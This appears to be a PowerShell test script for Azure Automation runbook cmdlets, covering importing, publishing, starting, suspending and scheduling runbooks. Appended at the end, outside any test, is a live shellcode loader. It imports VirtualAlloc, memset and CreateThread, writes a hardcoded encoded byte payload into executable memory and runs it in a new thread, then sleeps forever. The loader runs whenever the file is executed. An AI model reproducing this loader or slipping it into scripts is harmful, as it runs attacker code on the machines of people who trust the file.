















$accountName='fbs-aa-01'
$location = "East US"
$resourceGroupName = "to-delete-01"

function AssertContains
{
    param([string] $str, [string] $substr, [string] $message)

    if (!$message)
    {
        $message = "Assertion failed because '$str' does not contain '$substr'"
    }
  
    if (!$str.Contains($substr)) 
    {
        throw $message
    }
  
    return $true
}  


function CreateRunbook
{
    param([string] $runbookPath, [boolean] $byName=$false, [string[]] $tag, [string] $description, [string] $type = "PowerShell")

    $runbookName = gci $runbookPath | %{$_.BaseName}
    $runbook = Get-AzAutomationRunbook -AutomationAccountName $accountName -ResourceGroupName $resourceGroupName | where {$_.Name -eq $runbookName -and $_.RunbookType -eq $type} 
    if ($runbook.Count -eq 1)
    {
        $runbook | Remove-AzAutomationRunbook -Force
    }

    if(!$byName)
    {
        return Import-AzAutomationRunbook -AutomationAccountName $accountName -ResourceGroupName $resourceGroupName -Path $runbookPath -Tag $tag -Description $description -Type $type
    }
    else 
    {
        return New-AzAutomationRunbook -AutomationAccountName $accountName -ResourceGroupName $resourceGroupName -Name $runbookName -Tag $tag -Description $description -Type $type
    }
}






function WaitForJobStatus
{
    param([Guid] $Id, [Int] $numOfSeconds = 150, [String] $Status)
    
    $timeElapse = 0
    $interval = 3
    $endStatus = @('completed','failed')
    while($timeElapse -lt $numOfSeconds)
    {
        Wait-Seconds $interval
        $timeElapse = $timeElapse + $interval
        $job = Get-AzAutomationJob -AutomationAccountName $accountName -ResourceGroupName $resourceGroupName -Id $Id
        if($job.Status -eq $Status)
        {
            break
        }
        elseif($endStatus -contains $job.Status.ToLower())
        {	    
            Write-Output ("The Job with ID $($job.Id) reached $($job.Status) Status already.")
            return
        }
    }
    Assert-AreEqual $Status $job.Status "Job did not reach $Status status within $numOfSeconds seconds.";
}


function Test-RunbookWithParameter
{
    param([string] $runbookPath, [string] $type, [HashTable] $parameters, [int]$expectedResult)

    
    $automationAccount = Get-AzAutomationAccount -Name $accountName -ResourceGroupName $resourceGroupName
    Assert-NotNull $automationAccount "Automation account $accountName does not exist."

    $runbook = CreateRunbook  $runbookPath -type $type
    Assert-NotNull $runbook  "runBook $runbookPath does not import successfully."
    $automationAccount | Publish-AzAutomationRunbook -Name $runbook.Name

    
    $job = $automationAccount | Start-AzAutomationRunbook -Name $runbook.Name -Parameters $parameters
    WaitForJobStatus -Id $job.JobId -Status "Completed"
    $jobOutput = $automationAccount | Get-AzAutomationJobOutput -Id $job.JobId -Stream Output
    [int]$Result = $jobOutput | Select-Object -Last 1 -ExpandProperty Summary
    Assert-AreEqual $expectedResult $Result
    
    try {
      $jobOutputRecord = $jobOutput | Get-AzAutomationJobOutputRecord -ErrorAction Stop
    }
    catch {
      $jobOutputRecord = $null
    }
    
    Assert-NotNull $JobOutputRecord
    $automationAccount | Remove-AzAutomationRunbook -Name $runbook.Name -Force 
    Assert-Throws { $automationAccount | Get-AzAutomationRunbook -Name $runbook.Name}
}


function Test-AutomationStartAndStopRunbook
{
    param([string] $runbookPath)
        
	$automationAccount = Get-AzAutomationAccount -Name $accountName
    Assert-NotNull $automationAccount "Automation account $accountName does not exist."

    $runbook = CreateRunbook $runbookPath
    Assert-NotNull $runbook  "runBook $runbookPath does not import successfully."
    $automationAccount | Publish-AzAutomationRunbook -Name $runbook.Name
    
    
    $job = Start-AzAutomationRunbook -Name $runbook.Name -AutomationAccountName $accountName
    WaitForJobStatus -Id $job.Id -Status "Running"
    $automationAccount | Stop-AzAutomationJob -Id $job.Id
    WaitForJobStatus -Id $job.Id -Status "Stopped"
    $automationAccount | Remove-AzAutomationRunbook -Name $runbook.Name  -Force 
    Assert-Throws { $automationAccount | Get-AzAutomationRunbook -Name $runbook.Name}
}


function Test-AutomationPublishAndEditRunbook
{
    param([string] $runbookPath, [string] $editRunbookPath)
    
    $runbook = CreateRunbook $runbookPath $true

    
    Publish-AzAutomationRunbook $accountName -Name $runbook.Name
	$publishedRunbook = Get-AzAutomationRunbook  $accountName -Name $runbook.Name
	$runbookState = "Published"
    Assert-AreEqual $publishedRunbook.State $runbookState "Runbook should be in $runbookState state"
    $publishedRunbookDefn = Get-AzAutomationRunbookDefinition $accountName -Name $runbook.Name
    
    
    Set-AzAutomationRunbookDefinition $accountName -Name $runbook.Name -Path $runbookPath -Overwrite
    $runbook = Get-AzAutomationRunbook  $accountName -Name $runbook.Name
	$runbookState = "Edit"
    Assert-AreEqual $runbook.State $runbookState "Runbook should be in $runbookState state"
    $editedRunbookDefn = Get-AzAutomationRunbookDefinition $accountName -Name $runbook.Name -Slot "Draft"
    Assert-AreNotEqual $editedRunbookDefn.Content $publishedRunbookDefn.Content "Old content and edited content of the runbook shouldn't be equal"
    
    Assert-Throws {Set-AzAutomationRunbookDefinition $accountName -Name $runbook.Name -Path $editRunbookPath -PassThru -ErrorAction Stop} 
    Set-AzAutomationRunbookDefinition $accountName -Name $runbook.Name -Path $editRunbookPath -Overwrite
    $editedRunbookDefn2 = Get-AzAutomationRunbookDefinition $accountName -Name $runbook.Name -Slot "Draft"
    Assert-AreNotEqual $editedRunbookDefn2.Content $editedRunbookDefn.Content "Old content and edited content of the runbook shouldn't be equal"

    Remove-AzAutomationRunbook $accountName -Name $runbook.Name -Force
    Assert-Throws {Get-AzAutomationRunbook $accountName -Name $runbook.Name}

}


function Test-AutomationConfigureRunbook
{
    param([string] $runbookPath)
    
    
    $automationAccount = Get-AzAutomationAccount -Name $accountName
    Assert-NotNull $automationAccount "Automation account $accountName does not exist."
    $runbook = CreateRunbook $runbookPath
    Assert-NotNull $runbook  "runbook ($runbookPath) isn't imported successfully."
    Publish-AzAutomationRunbook -Name $runbook.Name -AutomationAccountName $accountName
    
    

    
    $automationAccount | Set-AzAutomationRunbook -Name $runbook.Name -LogVerbose $true -LogProgress $false
    $runbook = $automationAccount | Get-AzAutomationRunbook -Name $runbook.Name
    Assert-NotNull $runbook "Runbook shouldn't be Null"
    Assert-AreEqual $true $runbook.LogVerbose "Log Verbose mode should be true."
    Assert-AreEqual $false $runbook.LogProgress "Log Progress mode should be false."

    
    $job = $automationAccount | Start-AzAutomationRunbook -Name $runbook.Name
    WaitForJobStatus -Id $job.Id -Status "Completed"

    
    $jobOutputs = $automationAccount | Get-AzAutomationJobOutput -Id $job.Id -Stream "Output"
    Assert-AreEqual 1 $jobOutputs.Count
    AssertContains $jobOutputs[0].Text "output message" "The output stream is wrong."
    
    $jobVerboseOutputs = Get-AzAutomationJobOutput $accountName -Id $job.Id -Stream "Verbose"
    Assert-AreEqual 1 $jobVerboseOutputs.Count
    AssertContains $jobVerboseOutputs[0].Text "verbose message" "The verbose stream is wrong."
    
    $jobProgressOutputs = Get-AzAutomationJobOutput -AutomationAccountName $accountName -Id $job.Id -Stream "Progress"
    Assert-AreEqual 0 $jobProgressOutputs.Count
    
    
    Set-AzAutomationRunbook $accountName -Name $runbook.Name -LogVerbose $false -LogProgress $true
    $job = Start-AzAutomationRunbook $accountName -Name $runbook.Name
    WaitForJobStatus -Id $job.Id -Status "Completed"
    
    $jobProgressOutputs = Get-AzAutomationJobOutput $accountName -Id $job.Id -Stream "Progress"
    Assert-AreNotEqual 0 $jobProgressOutputs.Count
    Assert-AreEqual $jobProgressOutputs[0].Type "Progress"
    
    $jobVerboseOutputs = Get-AzAutomationJobOutput $accountName -Id $job.Id -Stream "Verbose"
    Assert-AreEqual 0 $jobVerboseOutputs.Count
    
    
    $jobs = Get-AzAutomationJob $accountName -RunbookName $runbook.Name
    Assert-AreEqual 2 $jobs.Count "There should be 2 jobs in total for this runbook."
    
    
    $automationAccount | Remove-AzAutomationRunbook -Name $runbook.Name -Force 
    Assert-Throws {$automationAccount | Get-AzAutomationRunbook -Name $runbook.Name}
}


function Test-AutomationSuspendAndResumeJob
{
    param([string] $runbookPath)
    
    
    $automationAccount = Get-AzAutomationAccount $accountName
    Assert-NotNull $automationAccount "Automation account $accountName does not exist."
    $runbook = CreateRunbook $runbookPath
    
    

    $automationAccount | Publish-AzAutomationRunbook -Name $runbook.Name
    
    $job = Start-AzAutomationRunbook $accountName -Name $runbook.Name
    WaitForJobStatus -Id $job.Id -Status "Running"
    Suspend-AzAutomationJob $accountName -Id $job.Id
    WaitForJobStatus -Id $job.Id -Status "Suspended"
    $automationAccount | Resume-AzAutomationJob -Id $job.Id
    WaitForJobStatus -Id $job.Id -Status "Completed"

    
    Remove-AzAutomationRunbook -AutomationAccountName $accountName -Name $runbook.Name -Force 
    Assert-Throws {Get-AzAutomationRunbook $accountName -Name $runbook.Name}
}


function Test-AutomationStartRunbookOnASchedule
{
    param([string] $runbookPath)
    
    
    $automationAccount = Get-AzAutomationAccount -Name $accountName
    $runbook = CreateRunbook $runbookPath
    Publish-AzAutomationRunbook $accountName -Name $runbook.Name
    
    

    
    $oneTimeScheName = "oneTimeSchedule"
    $schedule = Get-AzAutomationSchedule $accountName | where {$_.Name -eq $oneTimeScheName} 
    if ($schedule.Count -eq 1)
    {
        Remove-AzAutomationSchedule $accountName -Name $oneTimeScheName -Force
    }
    $startTime = (Get-Date).AddMinutes(7)
    New-AzAutomationSchedule $accountName -Name $oneTimeScheName -OneTime -StartTime $startTime
    $oneTimeSchedule = Get-AzAutomationSchedule $accountName -Name $oneTimeScheName
    Assert-NotNull $oneTimeSchedule "$oneTimeScheName doesn't exist!"
    
    
    $dailyScheName = "dailySchedule"
    $schedule = Get-AzAutomationSchedule $accountName | where {$_.Name -eq $dailyScheName} 
    if ($schedule.Count -eq 1)
    {
        Remove-AzAutomationSchedule $accountName -Name $dailyScheName -Force
    }
    $startTime = (Get-Date).AddDays(1)
    $expiryTime = (Get-Date).AddDays(3)
    New-AzAutomationSchedule $accountName -Name $DailyScheName -StartTime $startTime -ExpiryTime $expiryTime -DayInterval 1
    $dailySchedule = Get-AzAutomationSchedule $accountName -Name $dailyScheName
    Assert-NotNull $dailySchedule "$dailyScheName doesn't exist!"

    $runbook = Register-AzAutomationScheduledRunbook $accountName -Name $runbook.Name -ScheduleName $oneTimeScheName
    Assert-AreEqual $oneTimeScheName $runbook.ScheduleNames "The runbook should be associated with $oneTimeScheName"
    $runbook = Register-AzAutomationScheduledRunbook $accountName -Name $runbook.Name -ScheduleName $dailyScheName
    Assert-True { $runbook.ScheduleNames -Contains $dailyScheName} "The runbook should be associated with $dailyScheName"
   
    
    Wait-Seconds 420 
    $job = Get-AzAutomationJob $accountName -Name $runbook.Name | where {$_.ScheduleName -eq $oneTimeScheName}
	$jobSchedule = Get-AzAutomationScheduledRunbook $accountName -RunbookName $runbook.Name -ScheduleName $oneTimeScheName
	Assert-AreEqual 1 $jobSchedule.Count
    Assert-AreEqual 1 $job.Count
    WaitForJobStatus -Id $job.Id -Status "Completed"

    
    $description = "Daily Schedule Description"
    Set-AzAutomationSchedule $accountName -Name $dailyScheName -Description $description
    $dailySchedule = Get-AzAutomationSchedule $accountName -Name $dailyScheName
    Assert-AreEqual $description $dailySchedule.Description

    Unregister-AzAutomationScheduledRunbook $accountName -Name $runbook.Name -ScheduleName $dailyScheName
	$jobSchedule = Get-AzAutomationScheduledRunbook $accountName -RunbookName $runbook.Name -ScheduleName $dailyScheName
    Assert-Null $jobSchedule "The runbook shouldn't have an association with $dailyScheName"

    
    Remove-AzAutomationSchedule $accountName -Name $oneTimeScheName -Force
    Assert-Throws {$automationAccount | Get-AzAutomationSchedule -Name $oneTimeScheName}
    $automationAccount | Remove-AzAutomationSchedule -Name $dailyScheName -Force
    Assert-Throws {$automationAccount | Get-AzAutomationSchedule -Name $dailyScheName}
    Remove-AzAutomationRunbook $accountName -Name $runbook.Name -Force
    Assert-Throws {Get-AzAutomationRunbook $accountName -Name $runbook.Name}
}


function Test-AutomationStartUnpublishedRunbook
{
    param([string] $runbookPath)
    
    $tags = @("tag1","tag2")
    $description = "Runbook Description"
    $c = Get-Date
    $runbookParameters = @{"a" = "stringParameter"; "b" = 123; "c" = $c}
    $runbook = CreateRunbook $runbookPath $false $tags $description
    Assert-NotNull $runbook "runBook $runbookPath does not import successfully."
    Assert-NotNull $runbook.Tags "Tags of the runbook shouldn't be Null."
    Assert-NotNull $runbook.Description "Description of the runbook shouldn't be Null."
    Assert-Throws {Start-AzAutomationRunbook $accountName -Name $runbook.Name -Parameters $runbookParameters -PassThru -ErrorAction Stop} 
    
    Remove-AzAutomationRunbook $accountName -Name $runbook.Name -Force 
    Assert-Throws {Get-AzAutomationRunbook $accountName -Name $runbook.Name -Parameters $runbookParameters -PassThru -ErrorAction Stop}
}



function Test-RunbookWithParameterAndWait
{
    param([string] $runbookPath, [string] $type, [HashTable] $parameters, [int]$expectedResult)

    
    $automationAccount = Get-AzAutomationAccount -Name $accountName -ResourceGroupName $resourceGroupName
    Assert-NotNull $automationAccount "Automation account $accountName does not exist."

    $runbook = CreateRunbook  $runbookPath -type $type
    Assert-NotNull $runbook  "runBook $runbookPath does not import successfully."
    $automationAccount | Publish-AzAutomationRunbook -Name $runbook.Name

    
    $job = $automationAccount | Start-AzAutomationRunbook -Name $runbook.Name -Parameters $parameters  -Wait
	Assert-NotNull  $job
    [int]$Result = $job[$job.Length-1]
    Assert-AreEqual $expectedResult $Result
    
    $automationAccount | Remove-AzAutomationRunbook -Name $runbook.Name -Force
    Assert-Throws { $automationAccount | Get-AzAutomationRunbook -Name $runbook.Name}
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc7,0xba,0xeb,0xc4,0xfb,0x46,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x31,0x56,0x18,0x83,0xc6,0x04,0x03,0x56,0xff,0x26,0x0e,0xba,0x17,0x24,0xf1,0x43,0xe7,0x49,0x7b,0xa6,0xd6,0x49,0x1f,0xa2,0x48,0x7a,0x6b,0xe6,0x64,0xf1,0x39,0x13,0xff,0x77,0x96,0x14,0x48,0x3d,0xc0,0x1b,0x49,0x6e,0x30,0x3d,0xc9,0x6d,0x65,0x9d,0xf0,0xbd,0x78,0xdc,0x35,0xa3,0x71,0x8c,0xee,0xaf,0x24,0x21,0x9b,0xfa,0xf4,0xca,0xd7,0xeb,0x7c,0x2e,0xaf,0x0a,0xac,0xe1,0xa4,0x54,0x6e,0x03,0x69,0xed,0x27,0x1b,0x6e,0xc8,0xfe,0x90,0x44,0xa6,0x00,0x71,0x95,0x47,0xae,0xbc,0x1a,0xba,0xae,0xf9,0x9c,0x25,0xc5,0xf3,0xdf,0xd8,0xde,0xc7,0xa2,0x06,0x6a,0xdc,0x04,0xcc,0xcc,0x38,0xb5,0x01,0x8a,0xcb,0xb9,0xee,0xd8,0x94,0xdd,0xf1,0x0d,0xaf,0xd9,0x7a,0xb0,0x60,0x68,0x38,0x97,0xa4,0x31,0x9a,0xb6,0xfd,0x9f,0x4d,0xc6,0x1e,0x40,0x31,0x62,0x54,0x6c,0x26,0x1f,0x37,0xf8,0x8b,0x12,0xc8,0xf8,0x83,0x25,0xbb,0xca,0x0c,0x9e,0x53,0x66,0xc4,0x38,0xa3,0x89,0xff,0xfd,0x3b,0x74,0x00,0xfe,0x12,0xb2,0x54,0xae,0x0c,0x13,0xd5,0x25,0xcd,0x9c,0x00,0xd3,0xc8,0x0a,0x6b,0x8c,0xf8,0xdb,0x03,0xcf,0xfe,0xda,0x68,0x46,0x18,0x8c,0xde,0x09,0xb5,0x6c,0x8f,0xe9,0x65,0x04,0xc5,0xe5,0x5a,0x34,0xe6,0x2f,0xf3,0xde,0x09,0x86,0xab,0x76,0xb3,0x83,0x20,0xe7,0x3c,0x1e,0x4d,0x27,0xb6,0xad,0xb1,0xe9,0x3f,0xdb,0xa1,0x9d,0xcf,0x96,0x98,0x0b,0xcf,0x0c,0xb6,0xb3,0x45,0xab,0x11,0xe4,0xf1,0xb1,0x44,0xc2,0x5d,0x49,0xa3,0x59,0x57,0xdf,0x0c,0x35,0x98,0x0f,0x8d,0xc5,0xce,0x45,0x8d,0xad,0xb6,0x3d,0xde,0xc8,0xb8,0xeb,0x72,0x41,0x2d,0x14,0x23,0x36,0xe6,0x7c,0xc9,0x61,0xc0,0x22,0x32,0x44,0xd0,0x1f,0xe5,0xa0,0xa6,0x71,0x35;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

